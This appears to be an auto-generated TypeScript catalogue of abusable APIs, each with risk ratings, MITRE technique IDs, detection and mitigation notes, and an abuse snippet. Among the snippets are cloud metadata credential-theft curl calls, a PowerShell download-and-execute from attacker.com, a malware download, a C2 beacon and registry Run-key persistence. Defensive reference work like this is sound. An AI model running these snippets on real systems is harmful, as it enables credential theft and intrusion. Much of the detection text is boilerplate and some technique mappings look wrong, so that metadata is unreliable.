// Auto-generated file from YAML data - DO NOT EDIT MANUALLY
// Run: python bin/generate-api-data.py to regenerate

export interface RiskInfo {
  severity: string
  prevalence: string
  ease_of_abuse: string
  likelihood_in_real_attacks: number
}

export interface APIDetail {
  namespace: string
  language: string
  documentation: string
  class?: string
  function?: string
}

export interface AbuseScenario {
  name: string
  technique_id: string
  description: string
  code_snippet: string
  detection_difficulty: string
  common_in_campaigns: boolean
}

export interface Detection {
  vendor: string
  effectiveness: string
  notes: string
}

export interface Mitigation {
  category: string
  description: string
  feasibility: string
}

export interface References {
  threat_actors: string[]
  malware_families: string[]
  tools: string[]
}

export interface CompleteAPI {
  id: string
  name: string
  category: string
  subcategory: string
  risk: RiskInfo
  api: APIDetail
  techniques: string[]
  abuse_scenarios: AbuseScenario[]
  detection: Detection[]
  mitigation: Mitigation[]
  references: References
  tags: string[]
  author: string
  created: string
  verified: boolean
}

export const API_DATA: CompleteAPI[] = [
  {
    "id": "f4de2c0c-5ff2-4f85-ba3f-908676328776",
    "name": "ADSI - DirectoryEntry Authentication",
    "category": "Windows Com",
    "subcategory": "authentication",
    "risk": {
      "severity": "High",
      "prevalence": "emerging",
      "ease_of_abuse": "medium",
      "likelihood_in_real_attacks": 60
    },
    "api": {
      "namespace": "System.DirectoryServices",
      "language": ".NET",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry",
      "class": "DirectoryEntry",
      "function": ""
    },
    "techniques": [
      "T1110.003"
    ],
    "abuse_scenarios": [
      {
        "name": "Credential validation bypass",
        "technique_id": "T1110.003",
        "description": "Validate credentials without network traffic",
        "code_snippet": "var de = new DirectoryEntry(path, username, password); de.RefreshCache(new[]{\"objectClass\"}); // valid/invalid based on exception",
        "detection_difficulty": "medium",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on process tree and API patterns"
      },
      {
        "vendor": "Splunk",
        "effectiveness": "medium",
        "notes": "Correlate process events with network activity"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Block execution of ADSI - DirectoryEntry Authentication via AppLocker or similar controls",
        "feasibility": "medium"
      },
      {
        "category": "monitoring",
        "description": "Alert on unusual usage of ADSI - DirectoryEntry Authentication",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Empire",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows_com",
      "authentication",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "2c20164f-9ce6-4934-a30b-8f21b612457f",
    "name": "AWS EC2 Metadata Service",
    "category": "Cloud Metadata",
    "subcategory": "token-theft",
    "risk": {
      "severity": "Critical",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "AWS",
      "language": "HTTP",
      "documentation": "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
      "class": "EC2 Metadata Service",
      "function": ""
    },
    "techniques": [
      "T1552.001"
    ],
    "abuse_scenarios": [
      {
        "name": "IAM credential theft",
        "technique_id": "T1552.001",
        "description": "Access 169.254.169.254 to steal temporary credentials",
        "code_snippet": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of AWS EC2 Metadata Service",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "cloud-metadata",
      "token-theft",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "af95bf9c-514f-4f3d-8a72-9a25e8a4072a",
    "name": "Azure AD - Managed Identity Tokens",
    "category": "Cloud Metadata",
    "subcategory": "token-theft",
    "risk": {
      "severity": "Critical",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "Azure",
      "language": "HTTP",
      "documentation": "https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview",
      "class": "Managed Identity",
      "function": ""
    },
    "techniques": [
      "T1548.004"
    ],
    "abuse_scenarios": [
      {
        "name": "Service account privilege escalation",
        "technique_id": "T1548.004",
        "description": "Steal managed identity tokens for privilege escalation",
        "code_snippet": "curl http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com",
        "detection_difficulty": "easy",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of Azure AD - Managed Identity Tokens",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "cloud-metadata",
      "token-theft",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "32985ab5-3982-4a30-bba0-eeea8a574475",
    "name": "Chrome Extension - storage.sync API",
    "category": "Browser Extension",
    "subcategory": "data-exfiltration",
    "risk": {
      "severity": "Critical",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "chrome.storage",
      "language": "JavaScript",
      "documentation": "https://developer.chrome.com/docs/extensions/reference/api/storage",
      "class": "storage.sync",
      "function": ""
    },
    "techniques": [
      "T1528"
    ],
    "abuse_scenarios": [
      {
        "name": "OAuth token theft",
        "technique_id": "T1528",
        "description": "Steal OAuth tokens from browser storage",
        "code_snippet": "chrome.storage.sync.get(['oauth_token'], function(result) { exfiltrate(result.oauth_token); });",
        "detection_difficulty": "hard",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of Chrome Extension - storage.sync API",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "browser-extension",
      "data-exfiltration",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "cdea045a-a823-4735-8969-3619cfde0ee3",
    "name": "Chrome Extension - webRequest API",
    "category": "Browser Extension",
    "subcategory": "network-interception",
    "risk": {
      "severity": "Critical",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "chrome.webRequest",
      "language": "JavaScript",
      "documentation": "https://developer.chrome.com/docs/extensions/reference/api/webRequest",
      "class": "onBeforeSendHeaders",
      "function": ""
    },
    "techniques": [
      "T1557.002"
    ],
    "abuse_scenarios": [
      {
        "name": "Request interception and modification",
        "technique_id": "T1557.002",
        "description": "Intercept and modify HTTP requests for credential theft",
        "code_snippet": "chrome.webRequest.onBeforeSendHeaders.addListener(function(details) { /* inject headers */ }, {urls: ['<all_urls>']});",
        "detection_difficulty": "hard",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of Chrome Extension - webRequest API",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "browser-extension",
      "network-interception",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "9f0361b2-edcf-4dd4-b507-cc54d7019c47",
    "name": "Excel.Application COM Object",
    "category": "Windows Com",
    "subcategory": "persistence",
    "risk": {
      "severity": "High",
      "prevalence": "emerging",
      "ease_of_abuse": "medium",
      "likelihood_in_real_attacks": 75
    },
    "api": {
      "namespace": "Microsoft.Office.Interop.Excel",
      "language": "COM",
      "documentation": "https://learn.microsoft.com/en-us/office/vba/api/excel.application",
      "class": "Application",
      "function": ""
    },
    "techniques": [
      "T1137.002"
    ],
    "abuse_scenarios": [
      {
        "name": "Excel macro persistence",
        "technique_id": "T1137.002",
        "description": "Create malicious Excel macro for code execution",
        "code_snippet": "var excel = new Excel.Application(); excel.Workbooks.Open(...); excel.Run(\"macro\");",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on process tree and API patterns"
      },
      {
        "vendor": "Splunk",
        "effectiveness": "medium",
        "notes": "Correlate process events with network activity"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Block execution of Excel.Application COM Object via AppLocker or similar controls",
        "feasibility": "medium"
      },
      {
        "category": "monitoring",
        "description": "Alert on unusual usage of Excel.Application COM Object",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Empire",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows_com",
      "persistence",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "c9ab6299-daf6-42a1-b557-b71e14bcf773",
    "name": "GCP - Compute Metadata Service",
    "category": "Cloud Metadata",
    "subcategory": "token-theft",
    "risk": {
      "severity": "Critical",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "GCP",
      "language": "HTTP",
      "documentation": "https://cloud.google.com/docs/metadata/overview",
      "class": "Compute Metadata",
      "function": ""
    },
    "techniques": [
      "T1552.001"
    ],
    "abuse_scenarios": [
      {
        "name": "Service account key theft",
        "technique_id": "T1552.001",
        "description": "Access GCP service account keys from metadata endpoint",
        "code_snippet": "curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity",
        "detection_difficulty": "easy",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of GCP - Compute Metadata Service",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "cloud-metadata",
      "token-theft",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "aa396215-dd31-43ea-ba0b-4003c46f5750",
    "name": "MSXML.XMLHTTP COM Object",
    "category": "Windows Com",
    "subcategory": "network-communication",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "MSXML",
      "language": "COM",
      "documentation": "https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa927270(v=vs.85)",
      "class": "XMLHTTP3",
      "function": ""
    },
    "techniques": [
      "T1071.001"
    ],
    "abuse_scenarios": [
      {
        "name": "C2 communication without System.Net",
        "technique_id": "T1071.001",
        "description": "Establish HTTP communication via COM instead of managed APIs",
        "code_snippet": "var xml = new MSXML2.XMLHTTP(); xml.open(\"POST\", \"http://c2/beacon\", false); xml.send(beacon_data);",
        "detection_difficulty": "medium",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of MSXML.XMLHTTP COM Object",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows-com",
      "network-communication",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "983cf6d8-cfd7-4d10-a6ff-874c6c3cd954",
    "name": "MSXML.XMLHTTP.6.0 COM Object",
    "category": "Windows Com Api",
    "subcategory": "network-communication",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 75
    },
    "api": {
      "namespace": "MSXML.XMLHTTP",
      "language": "VBScript/JavaScript/PowerShell",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/xml/msxml-3-0",
      "class": "",
      "function": ""
    },
    "techniques": [
      "T1105"
    ],
    "abuse_scenarios": [
      {
        "name": "Download malware via XMLHTTP",
        "technique_id": "T1105",
        "description": "Fetch remote payloads without certutil or powershell",
        "code_snippet": "Set xmlHttp = CreateObject(\"MSXML2.XMLHTTP\") xmlHttp.Open \"GET\", \"http://attacker.com/malware.exe\" xmlHttp.Send",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Network IDS",
        "effectiveness": "high",
        "notes": "Monitor HTTP connections from script engines"
      },
      {
        "vendor": "Proxy logs",
        "effectiveness": "high",
        "notes": "Detect suspicious download patterns"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Restrict outbound HTTP from script engines",
        "feasibility": "high"
      }
    ],
    "references": {
      "threat_actors": [
        "APT1",
        "FIN7"
      ],
      "malware_families": [
        "Emotet",
        "IcedID"
      ],
      "tools": [
        "Custom scripts"
      ]
    },
    "tags": [
      "windows-com-api",
      "download",
      "c2"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "893b19e6-04de-4a73-9300-816c207490f1",
    "name": "Microsoft.Win32.Registry.CreateSubKey",
    "category": "Windows Dotnet Api",
    "subcategory": "registry-manipulation",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 85
    },
    "api": {
      "namespace": "Microsoft.Win32",
      "language": ".NET 1.1+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/microsoft.win32.registry.createsubkey",
      "class": "Registry",
      "function": ""
    },
    "techniques": [
      "T1547.001"
    ],
    "abuse_scenarios": [
      {
        "name": "Persistence via registry subkeys",
        "technique_id": "T1547.001",
        "description": "Create malware entries in Run keys for persistence",
        "code_snippet": "RegistryKey key = Registry.CurrentUser.CreateSubKey(@\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"); key.SetValue(\"Malware\", \"C:\\\\malware.exe\");",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Sysmon",
        "effectiveness": "high",
        "notes": "Event ID 13 - Registry Object Added or Modified"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Monitor Run key modifications",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [
        "APT1",
        "Lazarus"
      ],
      "malware_families": [
        "Emotet",
        "Ransomware variants"
      ],
      "tools": []
    },
    "tags": [
      "windows-dotnet-api",
      "registry",
      "persistence"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "7f291458-2178-4c4c-be2a-b4235f78db46",
    "name": "Microsoft.Win32.Registry.SetValue",
    "category": "Windows Dotnet Api",
    "subcategory": "persistence",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 85
    },
    "api": {
      "namespace": "Microsoft.Win32",
      "language": ".NET 1.0+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/microsoft.win32.registry.setvalue",
      "class": "Registry",
      "function": ""
    },
    "techniques": [
      "T1547.001"
    ],
    "abuse_scenarios": [
      {
        "name": "Registry persistence",
        "technique_id": "T1547.001",
        "description": "Persist malware via RunOnce or Run keys",
        "code_snippet": "Registry.SetValue(@\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Malware\", \"C:\\\\malware.exe\");",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on process tree and API patterns"
      },
      {
        "vendor": "Splunk",
        "effectiveness": "medium",
        "notes": "Correlate process events with network activity"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Block execution of Microsoft.Win32.Registry.SetValue via AppLocker or similar controls",
        "feasibility": "medium"
      },
      {
        "category": "monitoring",
        "description": "Alert on unusual usage of Microsoft.Win32.Registry.SetValue",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Empire",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows_dotnet_api",
      "persistence",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "644864ca-993d-4656-b887-ef1497eee2cd",
    "name": "PowerShell - Reflection Abuse",
    "category": "Script Engine",
    "subcategory": "code-execution",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "System.Reflection",
      "language": "PowerShell 5.0+",
      "documentation": "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_reflection",
      "class": "",
      "function": ""
    },
    "techniques": [
      "T1027.011"
    ],
    "abuse_scenarios": [
      {
        "name": "Bypass execution policies",
        "technique_id": "T1027.011",
        "description": "Use .NET reflection to execute code bypassing PowerShell restrictions",
        "code_snippet": "[Reflection.Assembly]::LoadWithPartialName('System.Reflection'); $a = New-Object System.Reflection.Assembly",
        "detection_difficulty": "hard",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of PowerShell - Reflection Abuse",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "script-engine",
      "code-execution",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "6dc5ff82-15f2-4fe7-b817-65ebe068c188",
    "name": "PowerShell - Reflection and .NET Abuse",
    "category": "Script Engine Api",
    "subcategory": "code-execution",
    "risk": {
      "severity": "Critical",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 95
    },
    "api": {
      "namespace": "PowerShell.exe",
      "language": "PowerShell",
      "documentation": "https://learn.microsoft.com/en-us/powershell/",
      "class": "",
      "function": ""
    },
    "techniques": [
      "T1027.011"
    ],
    "abuse_scenarios": [
      {
        "name": "Fileless malware via reflection",
        "technique_id": "T1027.011",
        "description": "Load .NET assemblies and invoke methods without writing to disk",
        "code_snippet": "[Reflection.Assembly]::LoadWithPartialName(\"System.Net\"); $wc = New-Object Net.WebClient; iex $wc.DownloadString('http://attacker.com/payload')",
        "detection_difficulty": "hard",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Monitor for suspicious PowerShell Reflection patterns"
      },
      {
        "vendor": "EDR",
        "effectiveness": "high",
        "notes": "Behavioral detection of reflection-based execution"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Restrict PowerShell execution via WDAC/AppLocker",
        "feasibility": "high"
      },
      {
        "category": "monitoring",
        "description": "Monitor PowerShell script block logging",
        "feasibility": "medium"
      }
    ],
    "references": {
      "threat_actors": [
        "APT29",
        "APT28",
        "FIN7"
      ],
      "malware_families": [
        "PowerShell Empire",
        "Cobalt Strike"
      ],
      "tools": [
        "Empire",
        "Cobalt Strike",
        "PSExec"
      ]
    },
    "tags": [
      "script-engine-api",
      "reflection",
      "fileless-malware"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "4383881b-5038-4b70-a30a-4b4b118915dc",
    "name": "Python - os.system/subprocess",
    "category": "Script Engine",
    "subcategory": "process-execution",
    "risk": {
      "severity": "Medium",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "os, subprocess",
      "language": "Python 3.x",
      "documentation": "https://docs.python.org/3/library/subprocess.html",
      "class": "",
      "function": ""
    },
    "techniques": [
      "T1059.009"
    ],
    "abuse_scenarios": [
      {
        "name": "Command execution via py.exe",
        "technique_id": "T1059.009",
        "description": "Execute system commands via Python on Windows",
        "code_snippet": "python.exe -c \"import subprocess; subprocess.call('whoami', shell=True)\"",
        "detection_difficulty": "easy",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of Python - os.system/subprocess",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "script-engine",
      "process-execution",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "93bb263d-30ea-43a7-b9bd-a3ca9744bd9a",
    "name": "Scripting.FileSystemObject COM Object",
    "category": "Windows Com Api",
    "subcategory": "file-operations",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 80
    },
    "api": {
      "namespace": "Scripting.FileSystemObject",
      "language": "VBScript/JavaScript",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/wmi_snmp/scripting-filesystemobject",
      "class": "",
      "function": ""
    },
    "techniques": [
      "T1566.001"
    ],
    "abuse_scenarios": [
      {
        "name": "Malware distribution via script",
        "technique_id": "T1566.001",
        "description": "Download and write malware files to disk",
        "code_snippet": "Set fso = CreateObject(\"Scripting.FileSystemObject\")\nfso.CopyFile \"\\\\\\\\attacker\\\\\\\\malware.exe\", \"C:\\\\malware.exe\", True",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Sysmon",
        "effectiveness": "high",
        "notes": "Monitor file creation from script engines"
      },
      {
        "vendor": "File Integrity Monitoring",
        "effectiveness": "high",
        "notes": "Detect unauthorized file creation/modification"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Disable Windows Script Host and VBScript",
        "feasibility": "high"
      }
    ],
    "references": {
      "threat_actors": [
        "APT1",
        "Lazarus"
      ],
      "malware_families": [
        "Emotet",
        "IcedID"
      ],
      "tools": [
        "Custom scripts"
      ]
    },
    "tags": [
      "windows-com-api",
      "file-operations",
      "script"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "8be4aeb9-fcd5-4f88-81d7-7687616d836b",
    "name": "Shell.Application COM Object",
    "category": "Windows Com Api",
    "subcategory": "shell-execution",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 75
    },
    "api": {
      "namespace": "Shell.Application",
      "language": "COM/VBScript/JavaScript",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/shell/shell",
      "class": "",
      "function": ""
    },
    "techniques": [
      "T1059.001"
    ],
    "abuse_scenarios": [
      {
        "name": "ShellExecute for command execution",
        "technique_id": "T1059.001",
        "description": "Execute commands via Shell.Application.ShellExecute",
        "code_snippet": "Set shell = CreateObject(\"Shell.Application\")\nshell.ShellExecute \"cmd.exe\", \"/c malware.exe\", \"\", \"open\", 1",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Sysmon",
        "effectiveness": "high",
        "notes": "Process creation from script engines (cscript.exe, wscript.exe)"
      },
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "high",
        "notes": "Behavior detection of Shell.Application.ShellExecute"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Disable Windows Script Host",
        "feasibility": "high"
      }
    ],
    "references": {
      "threat_actors": [
        "APT1",
        "FIN7"
      ],
      "malware_families": [
        "TrojanDropper variants"
      ],
      "tools": [
        "Empire",
        "Custom scripts"
      ]
    },
    "tags": [
      "windows-com-api",
      "command-execution",
      "script"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "23c5418c-99bb-4fe5-a049-c84dca8a528d",
    "name": "System.ComponentModel.TypeConverter",
    "category": "Windows Dotnet Api",
    "subcategory": "code-execution",
    "risk": {
      "severity": "Critical",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "System.ComponentModel",
      "language": ".NET 2.0+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.componentmodel.typeconverter",
      "class": "TypeConverter",
      "function": ""
    },
    "techniques": [
      "T1027.011"
    ],
    "abuse_scenarios": [
      {
        "name": "Deserialization gadget",
        "technique_id": "T1027.011",
        "description": "Abuse type conversion for RCE via deserialization",
        "code_snippet": "var converter = TypeDescriptor.GetConverter(typeof(InstanceDescriptor)); var obj = converter.ConvertFromString(gadgetPayload);",
        "detection_difficulty": "hard",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of System.ComponentModel.TypeConverter",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows-dotnet-api",
      "code-execution",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "25a1848d-1b23-4835-a5a1-09f77f91ffd8",
    "name": "System.Diagnostics.EventLog.WriteEntry",
    "category": "Windows Dotnet Api",
    "subcategory": "log-manipulation",
    "risk": {
      "severity": "Medium",
      "prevalence": "low",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 40
    },
    "api": {
      "namespace": "System.Diagnostics",
      "language": ".NET 1.1+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.eventlog.writeentry",
      "class": "EventLog",
      "function": ""
    },
    "techniques": [
      "T1562.002"
    ],
    "abuse_scenarios": [
      {
        "name": "Log injection/covering tracks",
        "technique_id": "T1562.002",
        "description": "Write fake entries to event log to cover malicious activity",
        "code_snippet": "EventLog.WriteEntry(\"Application\", \"Normal-looking event that masks actual activity\");",
        "detection_difficulty": "hard",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "SIEM",
        "effectiveness": "low",
        "notes": "Difficult to distinguish from legitimate entries"
      },
      {
        "vendor": "EDR",
        "effectiveness": "medium",
        "notes": "Monitor for unusual EventLog.WriteEntry patterns"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Restrict EventLog write access",
        "feasibility": "medium"
      },
      {
        "category": "monitoring",
        "description": "Use centralized logging to prevent local tampering",
        "feasibility": "high"
      }
    ],
    "references": {
      "threat_actors": [
        "Advanced APTs"
      ],
      "malware_families": [
        "Sophisticated malware"
      ],
      "tools": []
    },
    "tags": [
      "windows-dotnet-api",
      "log-manipulation",
      "defense-evasion"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "ff9a0c79-da53-4bab-ba8b-5e51e68ccb9a",
    "name": "System.Diagnostics.Process.Start",
    "category": "Windows Dotnet Api",
    "subcategory": "process-execution",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 95
    },
    "api": {
      "namespace": "System.Diagnostics",
      "language": ".NET 2.0+",
      "documentation": "https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process.start",
      "class": "Process",
      "function": ""
    },
    "techniques": [
      "T1059.001"
    ],
    "abuse_scenarios": [
      {
        "name": "Direct command execution",
        "technique_id": "T1059.001",
        "description": "Execute arbitrary commands without a parent shell",
        "code_snippet": "Process.Start(\"cmd.exe\", \"/c powershell.exe -nop -w hidden -c ...\");",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on process tree and API patterns"
      },
      {
        "vendor": "Splunk",
        "effectiveness": "medium",
        "notes": "Correlate process events with network activity"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Block execution of System.Diagnostics.Process.Start via AppLocker or similar controls",
        "feasibility": "medium"
      },
      {
        "category": "monitoring",
        "description": "Alert on unusual usage of System.Diagnostics.Process.Start",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Empire",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows_dotnet_api",
